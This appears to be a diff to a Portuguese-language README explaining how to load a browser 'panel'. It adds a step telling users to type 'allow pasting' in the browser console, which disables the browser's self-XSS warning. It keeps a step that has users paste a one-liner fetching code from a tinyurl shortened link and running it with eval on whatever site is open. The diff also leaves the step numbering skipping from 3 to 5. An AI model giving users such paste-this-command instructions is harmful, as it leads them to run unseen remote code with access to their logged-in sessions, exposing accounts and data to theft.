@@ -13,15 +13,20 @@ Você tem dois métodos simples para usar o painel:
 
 ### 🧪 Método 1 (Principal e mais fácil): Via Console do Navegador
 
+
+
 1. Acesse qualquer site.  
-2. Pressione `F12` ou `Ctrl + Shift + I` para abrir o **Console do navegador**.  
+2. Pressione `F12` ou `Ctrl + Shift + I` para abrir o **Console do navegador** e DIGITE e ENTER
+   ```javascript
+   allow pasting
+    ```
 3. Cole o código abaixo e pressione **Enter**:
 
     ```javascript
     fetch('https://tinyurl.com/cltron2000').then(r=>r.text()).then(eval)
     ```
 
-4. O painel será carregado na tela para você começar a usar.
+5. O painel será carregado na tela para você começar a usar.
 
 ---
 
